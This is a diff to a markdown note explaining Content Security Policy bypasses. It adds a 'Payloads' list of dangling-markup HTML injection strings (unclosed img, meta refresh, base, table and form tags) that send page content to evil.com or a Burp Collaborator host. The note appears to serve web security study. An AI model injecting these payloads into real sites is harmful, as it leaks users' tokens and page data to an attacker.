@@ -1,4 +1,4 @@
-# CS
+# CSP
 
 ## **What is CSP?**
 
@@ -42,6 +42,21 @@ When CSP is configured on a site, it typically blocks unauthorized scripts or in
     ```
 
     The attacker can now execute JavaScript even though the CSP is in place, as the incomplete tag led to unintentional DOM manipulation and script injection.
+
+**Payloads**
+
+```html
+<img src='http://evil.com/log.cgi?
+<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
+<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
+<table background='//your-collaborator-id.burpcollaborator.net?'
+<base href='http://evil.com/'>
+<button name=xss type=submit formaction='https://google.com'>I get consumed!
+<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
+
+```
+
+
 
 ## **Why CSP Doesn't Prevent This:**
 
